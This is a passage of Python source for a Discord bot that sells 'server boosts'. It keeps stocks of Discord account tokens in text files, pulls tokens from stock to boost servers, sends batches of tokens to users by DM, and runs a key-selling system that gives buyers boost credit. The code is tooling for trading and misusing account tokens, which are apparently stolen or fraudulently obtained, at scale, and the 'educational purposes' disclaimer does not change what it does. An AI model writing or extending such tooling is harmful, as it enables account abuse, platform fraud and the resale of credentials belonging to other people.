    if "discord.gg" in inv:
        invite = inv.split("discord.gg/")[1]
        return invite
    if "https://discord.gg" in inv:
        invite = inv.split("https://discord.gg/")[1]
        return invite
    if 'discord.com/invite' in inv:
        invite = inv.split("discord.com/invite/")[1]
        return invite
    if 'https://discord.com/invite/' in inv:
        invite = inv.split("https://discord.com/invite/")[1]
        return invite
    else:
        return inv

def checkInvite(invite: str):
    data = requests.get(
        f"https://discord.com/api/v9/invites/{invite}?inputValue={invite}&with_counts=true&with_expiration=true"
    ).json()

    if data["code"] == 10006:
        return False
    elif data:
        return data["guild"]["id"]
    else:
        return False
class BoostModal(Modal):
    def __init__(self):
        super().__init__(title = "Boost")
        self.add_item(
            TextInput(
                label = "Invite",
                placeholder = "Invite code of the server.",
                required = True,
                style = discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label = "Amount",
                placeholder = "Amount of boosts (must be in numbers).",
                required = True,
                style = discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label = "Months",
                placeholder = "Number of months (1/3).",
                required = True,
                style = discord.TextStyle.short
            )
        )

    async def on_submit(self, ctx: discord.Interaction):

        invite = self.children[0].value

        amount = int(self.children[1].value)

        months = int(self.children[2].value)

        await ctx.response.defer()

        if amount % 2 != 0:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="<:BlueCrown:1308450036652314645> `Error`",
                    description="<:Boosters:1091054020271030372>  `Number of boosts should be in even numbers`",
                    color=0xff00bf,
                )
            )

        if months != 1 and months != 3:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="<:BlueCrown:1308450036652314645> `Error`",
                    description="<:Boosters:1091054020271030372>  `Invalid Input`",
                    color=0xff00bf,
                )
            )

        inviteCode = getinviteCode(invite)
        inviteData = checkInvite(inviteCode)

        if inviteData == False:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="<:BlueCrown:1308450036652314645> `Error`",
                    description=f"<:Boosters:1091054020271030372>  `Invalid Invite | .gg/{invite}`",
                    color=0xff00bf,
                )
            )

        if months == 1:
            filename = "data/1m.txt"
        if months == 3:
            filename = "data/3m.txt"

        tokensStock = getStock(filename)
        requiredStock = int(amount / 2)

        if requiredStock > len(tokensStock):
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="<:BlueCrown:1308450036652314645> `Error`",
                    description=f"<:Boosters:1091054020271030372>  `Not enought stock. use the command /restock to restock tokens`",
                    color=0xff00bf,
                )
            )

        booster = Booster()

        tokens = []

        for x in range(requiredStock):
            tokens.append(tokensStock[x])
            remove(tokensStock[x], filename)

        await ctx.followup.send(
            embed=discord.Embed(
                title="<:BlueCrown:1308450036652314645> - `Boost Bot Information`", description=f"Joining And Boosting...", color=0xff00e1
            )
        )

        start = time.time()
        status = booster.thread(inviteCode, tokens, inviteData)
        time_taken = round(time.time() - start, 2)

        await ctx.followup.send(
            embed=discord.Embed(
                title="<:BlueCrown:1308450036652314645> - ```Boost Bot Information```",
                description=f"<:Boosters:1091054020271030372> `Ammount:` {amount} {months}m Boosts  \n<:Boosters:1091054020271030372> `Tokens:` {requiredStock} \n<:Boosters:1091054020271030372> `Server Link:` .gg/{inviteCode} \n<:Boosters:1091054020271030372> `Succeded Boosts:` {len(status['success'])*2} \n<:Boosters:1091054020271030372> `Failed Boosts` {len(status['failed'])}\n<:Boosters:1091054020271030372> `Time Took` {time_taken}seconds \n \n \n  ** Failed ** \n ``` {status['failed']}``` ** Captcha ** \n ``` {status['captcha']}``` \n **Success** \n ``` {status['success']}```",
                color=0xff00bf,
            )
        )
        content = ""
        if webhook_url != "" and use_log == True:
            embed = DiscordEmbed(title="<:BlueCrown:1308450036652314645> - ```Boost Bot Information```", description=f"<:Boosters:1091054020271030372> `Ammount:` {amount} {months}m Boosts  \n<:Boosters:1091054020271030372> `Tokens:` {requiredStock} \n<:Boosters:1091054020271030372> `Server Link:` .gg/{inviteCode} \n<:Boosters:1091054020271030372> `Succeded Boosts:` {len(status['success'])*2} \n<:Boosters:1091054020271030372> `Failed Boosts` {len(status['failed'])}\n<:Boosters:1091054020271030372> `Time Took` {time_taken}seconds \n \n \n  ** Failed ** \n ``` {status['failed']}``` ** Captcha ** \n ``` {status['captcha']}``` \n **Success** \n ``` {status['success']}", color=0xff00e1)
            send_webhook_message(webhook_url, content, embed)

        try:
            if config['customisation']['enable']:
                booster.humanizerthread(tokens=tokens)
        except Exception as e:
            print(e)

statusb = config['status']
@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Activity(type=discord.ActivityType.listening, name=f'{statusb}'))
    print(f"{L}[{Fore.WHITE}APP{L}]{L1} |{Style.RESET_ALL} {bot.user} Got Active Using Port 8000.{Fore.RESET}")
    try:        
        await bot.tree.sync()
        bot.add_view(PanelView())
        bot.add_view(AutoView())


        logging.info(f'Loaded Successfully In 21ms')
    except Exception as e:
        print(e)

class ViewPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Create Keys", custom_id="newkeys", style=discord.ButtonStyle.green)
    async def panel_boost(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(KeyCreationModal())
        else:
            await interaction.response.send_message("unauthorized", ephemeral=True)

    @discord.ui.button(label="Key Filter", custom_id="keyfilter", style=discord.ButtonStyle.red)
    async def panel_stock(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(KeyFilterModal())
        else:
            await interaction.response.send_message("unauthorized", ephemeral=True)

    @discord.ui.button(label="Request Keys", custom_id="getallkeys", style=discord.ButtonStyle.blurple)
    async def panel_stock(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(KeyRequestModal())
        else:
            await interaction.response.send_message("unauthorized", ephemeral=True)

@bot.tree.command(
   name="keyspanel", description="Shows the keys panel."
)
async def panel(
    ctx
):  
    embed = discord.Embed(
        title = "<:BlueCrown:1308450036652314645> `Boost Bot Keys`"

    ).add_field(
        name = "<:BlueCrown:1308450036652314645>  `Config`",
        value = "<:Boosters:1091054020271030372> 1 - `Create New Keys` \n <:Boosters:1091054020271030372> 1 - `Get Keys` \n <:Boosters:1091054020271030372> 1 - `Keys Filter`"
        
    ).set_thumbnail(url = "https://media.discordapp.net/attachments/1266093799541575798/1267526368355418132/avatar.png?ex=66a91b6b&is=66a7c9eb&hm=da749b3d201ddfcf40d36021ec4cf8a15584d3447de7f218861fb7bbb9c229af&=&format=webp&quality=lossless&width=595&height=595")
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        await ctx.response.send_message(embed = embed, view = ViewPanel())
    else: 
        await ctx.response.send_message('unauthorised')



@bot.tree.command(
    name="boost", description="Boost a server by using that command."
)
async def boost(
    ctx: discord.Interaction
):

    if str(ctx.user.id) not in config["owners_ids"]:
     member = ctx.guild.get_member(ctx.user.id)
     if str(ctx.user.id) not in config["owners_ids"] and not any(str(role.id) in config["admin_role_ids"] for role in member.roles):

        return await ctx.response.send_message(
            embed=discord.Embed(
                title="<:BlueCrown:1308450036652314645> `Error`",
                description="<:Boosters:1091054020271030372>  `Missing Permistions`",
                color=0xff00bf,
            )
        )

    modal = BoostModal()
    await ctx.response.send_modal(modal)

def remove(token: str, filename: str):
    tokens = getStock(filename)
    tokens.pop(tokens.index(token))
    f = open(filename, "w")

    for x in tokens:
        f.write(f"{x}\n")

    f.close()

class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Boost", custom_id="panelboost", style=discord.ButtonStyle.green)
    async def panel_boost(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(BoostModal())
        else:
            await interaction.response.send_message("Unauthorised", ephemeral=True)

    @discord.ui.button(label="Check Stock", custom_id="panelstock", style=discord.ButtonStyle.gray)
    async def panel_stock(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(LivestockModal())
        else:
            await interaction.response.send_message("Unauthorised", ephemeral=True)

    @discord.ui.button(label="Manual Restock", custom_id="panelrestock", style=discord.ButtonStyle.blurple)
    async def panel_restock(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(RestockModal())
        else:
            await interaction.response.send_message("Unauthorised", ephemeral=True)

    @discord.ui.button(label="Transfer Tokens", custom_id="panelgivetoken", style=discord.ButtonStyle.red)
    async def panel_givetoken(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            await interaction.response.send_modal(SendtokensModal())
        else:
            await interaction.response.send_message("Unauthorised", ephemeral=True)


class AutoView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="AutoBoost", custom_id="autoboost", style=discord.ButtonStyle.green)
    async def panel_boost(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(Auto_Boost_Modal())

    @discord.ui.button(label="Check Key", custom_id="check_key_information", style=discord.ButtonStyle.gray)
    async def check_key(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(Check_Key_Modal())

    @discord.ui.button(label="Check Stock", custom_id="check_stock", style=discord.ButtonStyle.blurple)
    async def stock(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(LivestockModal())

    @discord.ui.button(label="Auto Boost Guide", custom_id="auto_guide", style=discord.ButtonStyle.red)
    async def guide(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(
            title="<:BlueCrown:1308450036652314645> `Auto Boosting Panel`",
            description=(
                "```FAQS```\n"
                "1. How to use the auto boosting?\n"
                "-> Click on the AutoBoost button and a modal/form will appear where you have to enter the key, invite of server, nickname, and bio for the tokens!\n"
                "2. What if the boosts fail?\n"
                "-> Thanks to the advanced key system! If the boosts fail, for example, you have a key with 14 boosts as balance and some boosts fail due to token issues, the total balance minus successful boosts will be deducted. The remaining balance will still be available, and you can retry with the key again!\n"
                "3. What if the bot doesn't have stock?\n"
                "-> Create a support ticket and contact the management!"
            ),
            color=0xff69b4  # Pink color
        )
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/1266093799541575798/1267526368355418132/avatar.png?ex=66aa6ceb&is=66a91b6b&hm=fceb67d104715faf810ba39a6f16c5ed6bdec0d0cd1b030d63cfe06856674edd&=&format=webp&quality=lossless&width=595&height=595")
        await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(
   name="boostpanel", description="Shows the boost bot panel."
)
async def panel(
    ctx
):  
    embed = discord.Embed(
        title = "<:BlueCrown:1308450036652314645> `Boost Bot Config`"

    ).add_field(
        name = "<:Boosters:1091054020271030372>  `Config`",
        value = "<:Boosters:1091054020271030372> 1 - `Server Booster`\n<:Boosters:1091054020271030372> 2 - `Check Stock` \n<:Boosters:1091054020271030372> 3 - `Give Tokens To a User Via Dm` \n <:Boosters:1091054020271030372> 4 - `Manual Restock`"
        
    ).set_thumbnail(url = "https://media.discordapp.net/attachments/1266093799541575798/1267526368355418132/avatar.png?ex=66a91b6b&is=66a7c9eb&hm=da749b3d201ddfcf40d36021ec4cf8a15584d3447de7f218861fb7bbb9c229af&=&format=webp&quality=lossless&width=595&height=595")
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        await ctx.response.send_message(embed = embed, view = PanelView())
    else: 
        await ctx.response.send_message('unauthorised')
class SendtokensModal(Modal):
    def __init__(self):
        super().__init__(title = "Transfer Tokens")

        self.add_item(
            TextInput(
                label = "User Id",
                placeholder = "The member you want to send.",
                required = True,
                style = discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label = "Amount",
                placeholder = "Amount of tokens to send.",
                required = True,
                style = discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label = "Months",
                placeholder = "Number of months (1/3).",
                required = True,
                style = discord.TextStyle.short
            )
        )

    async def on_submit(self, ctx):

        member = ctx.guild.get_member(int(self.children[0].value))
        amount = int(self.children[1].value)
        months = int(self.children[2].value)

        await ctx.response.defer()

        if months != 1 and months != 3:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="<:BlueCrown:1308450036652314645> `Error`",
                    description="<:Boosters:1091054020271030372>  `Invalid Inputs`",
                    color=0xff00bf,
                )
            )

        if months == 1:
            filename = "data/1m.txt"
        if months == 3:
            filename = "data/3m.txt"

        tokensStock = getStock(filename)

        if amount > len(tokensStock):
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="<:BlueCrown:1308450036652314645> `Error`",
                    description=f"<:Boosters:1091054020271030372>  `Not enough stock use /restock to restock`",
                    color=0xff00bf,
                )
            )

        tokens = []
        for x in range(amount):
            tokens.append(tokensStock[x])
            remove(tokensStock[x], filename)

        stuff = "\n".join(tokens)

        with open("result.txt", "w") as file:
            file.write(stuff.format("\n", "\n"))

        with open("result.txt", mode="rb") as f:
            await member.send(
                embed=discord.Embed(
                    title="<:BlueCrown:1308450036652314645> `Boost Bot`",
                    description=f"<:Boosters:1091054020271030372>  `Thanks for using us`",
                    color=0xff00bf,
                ),
                file=discord.File(f),
            )

        return await ctx.followup.send(
            embed=discord.Embed(
                title="<:BlueCrown:1308450036652314645> `Boost Bot`",
                description=f"<:Boosters:1091054020271030372>  `Sent {amount} tokens.`",
                color=0xff00bf,
            )
        )

@bot.tree.command(
name="transfertokens", description="Sends the tokens to the user."
)
async def sendtokens(
    ctx,
):

     member = ctx.guild.get_member(ctx.user.id)
     if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        await ctx.response.send_modal(SendtokensModal())
     else:
         await ctx.response.send_message("❌ | stop trying to heck me :(")

class MyView(discord.ui.View):
    @discord.ui.button(label="Staff Commands", row=1, style=discord.ButtonStyle.blurple, )
    async def first_button_callback(self, interaction, button):
        await interaction.response.send_message(embed=discord.Embed(
            title="__Staff Commands__",
            description="`/boost` \n *[ Boosts a specific server that the owner tells it to ]* \n  `/restock` \n *[ Adds a txt with 1m / 3m boost tokens and adds them to stock ]* \n `/stock` \n [ Take which type of stock you wanna check! ] \n `/transfertokens` \n *[ Gets user id and sends tokens to the user in dms ]* \n `/boostpanel` \n *[ Shows admins boost panel ]* \n `/newowner` \n *[ Add new owner / admin in access the bot ( only works on user ids and not roles ) ]* \n `/failed` \n *[ Get the tokens which failed in boosting directly in your dms ]* \n `/filecleaner` \n *[ Cleans the nitro tokens file 3m Or 1m ]*",
            color=0xff00bb,
        ))
    @discord.ui.button(label="Public Commands", row=1, style=discord.ButtonStyle.red)
    async def second_button_callback(self, interaction, button):
        await interaction.response.send_message(embed=discord.Embed(
            title='__Public Commands__',
            description='**/get_key_information** \n [ Takes (key) and return information about the key such as month & boost amount it have! ] \n **/get_used_key_information** \n [ Takes (used_key) and return information about the key such as month, boost, successful boosts, failed boosts and time taken for boosting! ] \n **/use_key** \n [ Manual way of using keys! ]',
            color=0xff00bb,
        ))

@bot.tree.command( name="commands", description="It will show all the avaliable commands")
async def commands(ctx):
    await ctx.response.send_message(
        embed=discord.Embed(
            title="Command Prompt",
            description="`Options` \n 1 ~ Staff Commands [Only For Owners] \n 2 ~ Public Avaliable Commands [General]  \n `Disclaimer` \n [ This Product Is For Educational Purposes ONLY! ]",
            color=0xff00bb
            ),
            view=MyView()
    )

@bot.tree.command( name="ping", description="ping latency")
async def ping(ctx):
    await ctx.response.send_message(
        embed=discord.Embed(
            title="Ping Latency",
            description="*Ping Latency: `32.91ms`*",
            ),
    )

@bot.tree.command(name='showconfig', description='Displays the configuration from config.json')
async def showconfig(interaction: discord.Interaction):
    # Load the configuration file
    with open('config/config.json') as f:
        config = json.load(f)

    # Create the embed
    embed = discord.Embed(title='<:BlueCrown:1308450036652314645> `Config File`', color=discord.Color.from_rgb(255, 0, 238))  # Pink color
    embed.set_thumbnail(url='https://media.discordapp.net/attachments/1266093799541575798/1267526368355418132/avatar.png?ex=66aa6ceb&is=66a91b6b&hm=fceb67d104715faf810ba39a6f16c5ed6bdec0d0cd1b030d63cfe06856674edd&=&format=webp&quality=lossless&width=595&height=595')  # Replace with your thumbnail URL

    # Add fields for each item in the configuration
    for key, value in config.items():
        embed.add_field(name=key, value=str(value), inline=False)

    # Send the embed
    await interaction.response.send_message(embed=embed)




@bot.tree.command(
 name="newowner", description="Add a member as a owner."
)
async def newowner(
    ctx,
    member: discord.Member
):
    if str(ctx.user.id) not in config["owners_ids"]:
        return await ctx.response.send_message(
            embed=discord.Embed(
                title="**ERROR**",
                description="❎ | You cannot use this command.",
                color=0x2F3136,
            )
        )

    config["owners_ids"].append(str(member.id))
    with open("config/config.json", "w") as f:
        json.dump(config, f, indent=4)
    c = ctx.channel
    return await c.send(
        embed=discord.Embed(
            title="Boost Bot",
            description=f"✅ | Added owner successfully",
            color=0x2F3136,
        )
    )

@bot.tree.command(
 name="addadmin_role", description="Add a member as a owner."
)
async def addadmin_role(
    ctx,
    role: discord.Role
):
    if str(ctx.user.id) not in config["owners_ids"]:
        return await ctx.response.send_message(
            embed=discord.Embed(
                title="**ERROR**",
                description="❎ | You cannot use this command.",
                color=0x2F3136,
            )
        )
    c = ctx.channel    
    config["admin_role_ids"].append(str(role.id))
    with open("config/config.json", "w") as f:
        json.dump(config, f, indent=4)

    return await c.send(
        embed=discord.Embed(
            title="Boost Bot",
            description=f"✅ | Added admin successfully",
            color=0x2F3136,
        )
    )

import asyncio


class LivestockModal(Modal):
    def __init__(self):
        super().__init__(title="Stocks")

        self.add_item(
            TextInput(
                label="Duration",
                placeholder="Months? [1/3]",
                required=True,
                style=discord.TextStyle.short
            )
        )

    async def on_submit(self, interaction: Interaction):
        duration = int(self.children[0].value)

        await interaction.response.defer(ephemeral=False)

        if duration not in [1, 3]:
            return await interaction.followup.send(
                embed=discord.Embed(
                    title="<:BlueCrown:1308450036652314645> `Error`",
                    description="<:Boosters:1091054020271030372>  `Invalid Type` ",
                    color=0x2F3136,
                ), ephemeral=True
            )

        if duration == 1:
            fileName = "data/1m.txt"
        elif duration == 3:
            fileName = "data/3m.txt"

        async def update_stock_message(message):
            while True:
                stock = len(open(fileName, "r").readlines())
                if stock == 0:
                    stock = 0

                embed = discord.Embed(
                    title=f"<:BlueCrown:1308450036652314645> ```{duration}m Tokens Live Stock```",
                    description=f"\n <:Boosters:1091054020271030372> *`{stock}` Nitro Tokens In Stock* \n *<:Boosters:1091054020271030372> `{stock * 2}` Boosts Available In Stock*",
                    color=0xff008c,
                )
                await message.edit(embed=embed)
                await asyncio.sleep(config["refresh_interval"])  # Refresh based on config

        initial_embed = discord.Embed(
            title=f"<:BlueCrown:1308450036652314645> ```{duration}m Tokens Live Stock```",
            description=f"Refreshing in {config['refresh_interval'] // 60} minutes...",
            color=0xff008c,
        )

        message = await interaction.followup.send(embed=initial_embed)
        await update_stock_message(message)

# Ensure the command function is a coroutine
@bot.tree.command(name="livestock", description="Display the stock of boosts and tokens.")
async def show_livestock(interaction: discord.Interaction):
    await interaction.response.send_modal(LivestockModal())


class RestockModal(Modal):
    def __init__(self):
        super().__init__(title="Restock Tokens")

        self.add_item(
            TextInput(
                label="Duration",
                placeholder="Months? [1/3]",
                required=True,
                style=discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label="Tokens",
                placeholder="Enter Tokens",
                required=True,
                style=discord.TextStyle.paragraph,
                max_length=4000
            )
        )

    async def on_submit(self, ctx: Interaction):
        duration = int(self.children[0].value)
        input_value = str(self.children[1].value)
        tokens = re.split(r',|\n', input_value)

        if duration not in [1, 3]:
            return await ctx.response.send_message(
                embed=discord.Embed(
                    title=f"**👎 `404 ERROR` - **{bot.user}****",
                    description="👎 - ```Invalid Duration. Number should be 1-3```",
                    color=0xff00d4,
                )
            )

        fileName = f"data/{duration}m.txt"

        with open(fileName, "a") as f:
            f.write("\n".join(tokens) + "\n")

        await ctx.response.send_message(
            embed=discord.Embed(
                title="<:BlueCrown:1308450036652314645> `Restock`",
                description=f"<:Boosters:1091054020271030372>  `Restocked {len(tokens)}x tokens for {duration}m `",
                color=0xff00d4,
            )
        )



        if duration == 1:
            fileName = "data/1m.txt"
        elif duration == 3:
            fileName = "data/3m.txt"

        with open(fileName, "a") as f:
            for t in tokens:
                f.write(t+"\n")

        await ctx.response.send_message(
            embed=discord.Embed(
                title=f"<:BlueCrown:1308450036652314645> - `Restock`",
                description=f"<:Boosters:1091054020271030372>  `Restocked {len(tokens)}x tokens for {duration}m` ",
                color=0xff00d9,
            )
        )

@bot.tree.command(
 name="restock", description="Add new nitro tokens to the boost bot!"
)
async def restock(
    ctx,
    type: int,
    file: discord.Attachment
    ):

    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) not in config["owners_ids"] and not any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        return await ctx.response.send_message(
            embed=discord.Embed(
                title=f"⚠️`WARNING` - **{bot.user}**",
                description="⚠️ - ```You are not allowed to be using this```",
                color=0xffa600,
            )
        )

    if type != 1 and type != 3 and type != 0:
        return await ctx.response.send_message(
            embed=discord.Embed(
                title=f"👎 `404 ERROR` - **{bot.user}**",
                description="👎 - ```Wrong input. values should be in 1-3```",
                color=0xff0000,
            )
        )

    if type == 1:
        fileName = "data/1m.txt"
    elif type == 3:
        fileName = "data/3m.txt"

    content = await file.read()

    stuff = content.decode().split("\r\n")
    before = getStock(fileName)

    for x in range(len(before)):
        stuff.append(before[x])

    cute = "\n".join(stuff)
    text = cute.replace("b'", "").replace("'", "")

    with open(fileName, "w") as file:
        file.write(text + "\n")
    file_paths = ['data/1m.txt', 'data/3m.txt']
    for file_path in file_paths:
        check_file_for_unusual_text(file_path)    

    return await ctx.response.send_message(
        embed=discord.Embed(
            title=f"<:BlueCrown:1308450036652314645> - `Restock`",
            description=f"<:Boosters:1091054020271030372> `Restocked Tokens:` ",
            color=0xff00d9,
        )
    )
    
from discord.ext import commands, tasks
def get_ltc_price():
    url = "https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd"
    response = requests.get(url).json()
    return response["litecoin"]["usd"]

# Command to get and display the LTC price
@bot.tree.command(name="ltcprice")
async def ltcprice(interaction: discord.Interaction):
    embed = discord.Embed(
        title="<:BlueCrown:1308450036652314645> **`Fetching New Price`**",
        color=0xff008c,
    )
    message = await interaction.response.send_message(embed=embed)
    message = await interaction.original_response()
    await update_ltc_price_message(message)

# Function to update the LTC price embed
async def update_ltc_price_message(message):
    while True:
        price = get_ltc_price()
        embed = discord.Embed(
            title="<:BlueCrown:1308450036652314645> **`Litecoin Price`**",
            description=f"<:Boosters:1091054020271030372> The current price of LTC is `${price}`",
            color=0xff008c,
        )
        embed.set_thumbnail(url="https://cryptologos.cc/logos/litecoin-ltc-logo.png")
        embed.set_footer(text="Refreshing In 60 Seconds")
        await message.edit(embed=embed)
        await asyncio.sleep(60)
class KeyCreationModal(Modal):
    def __init__(self):
        super().__init__(title="Create New Keys")

        # Define the input fields
        self.add_item(
            TextInput(
                label="Month",
                placeholder="Enter the month (1 or 3)",
                required=True,
                style=discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label="Boosts Amount",
                placeholder="Enter the number of boosts (must be even)",
                required=True,
                style=discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label="Quantity",
                placeholder="Enter the quantity (1-100)",
                required=True,
                style=discord.TextStyle.short
            )
        )

    async def on_submit(self, interaction: discord.Interaction):
        # Extract and process the input values
        month = int(self.children[0].value)
        boosts_amount = int(self.children[1].value)
        quantity = int(self.children[2].value)

        if month not in [1, 3]:
            return await interaction.response.send_message(
                embed=discord.Embed(
                    title="**❌ Invalid Month**",
                    description="The month should be either 1 or 3.",
                    color=0xff00bb,
                )
            )

        if boosts_amount % 2 != 0:
            return await interaction.response.send_message(
                embed=discord.Embed(
                    title="**❌ Invalid Boosts Amount**",
                    description="The number of boosts must be an even number.",
                    color=0xff00bb,
                )
            )

        if quantity > 100:
            return await interaction.response.send_message(
                embed=discord.Embed(
                    title="**❌ Quantity Limit Exceeded**",
                    description="The quantity cannot be greater than 100.",
                    color=0xff00bb,
                )
            )

        # Assuming authsystem is a module handling key generation
        keys = authsystem.load_keys_from_file("data/keys/keys.json")
        authsystem.generate_key(keys, month, boosts_amount, quantity, "data/keys/keys.json")

        await interaction.response.send_message(
            embed=discord.Embed(
                title="<:BlueCrown:1308450036652314645> - `Boost Bot`",
                description=f"Successfully created {quantity} keys for {boosts_amount}x {month} month server boosts! Use `/get_keys` to fetch/download them.",
                color=0xff00bb,
            )
        )

# Command to trigger the modal
@bot.tree.command(name='new_keys', description="Command to create key for key order system")
async def new_keys(ctx: discord.Interaction):
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        # Open the modal
        modal = KeyCreationModal()
        await ctx.response.send_modal(modal)
    else:
        await ctx.response.send_message(
            embed=discord.Embed(
                title="<:BlueCrown:1308450036652314645> - `Boost Bot`",
                description="❌ `You are not authorized to use this command`",
                color=0xff00bb,
            )
        )





class KeyRequestModal(Modal):
    def __init__(self):
        super().__init__(title="Request All Keys")

    async def on_submit(self, interaction: discord.Interaction):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            try:
                with open("data/keys/keys.json", "rb") as file:
                    await interaction.user.send(file=discord.File(file, "keys.txt"))
                    await interaction.response.send_message("Please, check your DMs and make sure it's open.", ephemeral=True)
            except FileNotFoundError:
                await interaction.response.send_message("No keys found.")
        else:
            await interaction.response.send_message("You are not authorized to use this command.")

@bot.tree.command(name='get_all_keys', description="Command to get keys for key order system")
async def get_all_keys(ctx: discord.Interaction):
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        # Open the modal
        modal = KeyRequestModal()
        await ctx.response.send_modal(modal)
    else:
        await ctx.response.send_message(
            embed=discord.Embed(
                title="<:BlueCrown:1308450036652314645> - `Boost Bot`",
                description="❌ `You are not authorized to use this command`",
                color=0xff00bb,
            )
        )


class KeyFilterModal(Modal):
    def __init__(self):
        super().__init__(title="Get Keys")

        # Define the input fields
        self.add_item(
            TextInput(
                label="Month",
                placeholder="Enter the month (e.g., 1 or 3)",
                required=True,
                style=discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label="Amount",
                placeholder="Enter the amount",
                required=True,
                style=discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label="Quantity",
                placeholder="Enter the quantity (number of keys)",
                required=True,
                style=discord.TextStyle.short
            )
        )

    async def on_submit(self, interaction: discord.Interaction):
        month = int(self.children[0].value)
        amount = int(self.children[1].value)
        quantity = int(self.children[2].value)

        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            try:
                with open("data/keys/keys.json", "r") as file:
                    all_keys = json.load(file)

                filtered_keys = [key for key in all_keys if key['month'] == month and key['amount'] == amount]
                if len(filtered_keys) < quantity:
                    await interaction.response.send_message("Not enough keys found for the specified criteria.")
                    return

                keys_to_send = filtered_keys[:quantity]
                keys_str = '\n'.join(key['key'] for key in keys_to_send)

                with open("data/keys/filtered_keys.txt", "w") as file:
                    file.write(keys_str)

                with open("data/keys/filtered_keys.txt", "rb") as file:
                    await interaction.user.send(file=discord.File(file, "filtered_keys.txt"))

                await interaction.response.send_message("Filtered keys sent to your DM.")
            except FileNotFoundError:
                await interaction.response.send_message("No keys found.")
        else:
            await interaction.response.send_message("You are not authorized to use this command.")

@bot.tree.command(name='get_keys', description="Command to get keys for key order system")
async def get_keys(ctx: discord.Interaction):
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        # Open the modal
        modal = KeyFilterModal()
        await ctx.response.send_modal(modal)
    else:
        await ctx.response.send_message(
            embed=discord.Embed(
                title="<:BlueCrown:1308450036652314645> - `Boost Bot`",
                description="❌ `You are not authorized to use this command`",
                color=0xff00bb,
            )
        )

@bot.tree.command(name='delete_keys', description="Command to delete keys from the system")
async def delete_keys(ctx, month: int, amount: int, quantity: int, delete_all_keys: bool = False):
  member = ctx.guild.get_member(ctx.user.id)

  if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
    try:
        with open("data/keys/keys.json", "r") as file:
            all_keys = json.load(file)

        if delete_all_keys:
            all_keys = []
        else:
            filtered_keys = [key for key in all_keys if key['month'] == month and key['amount'] == amount]
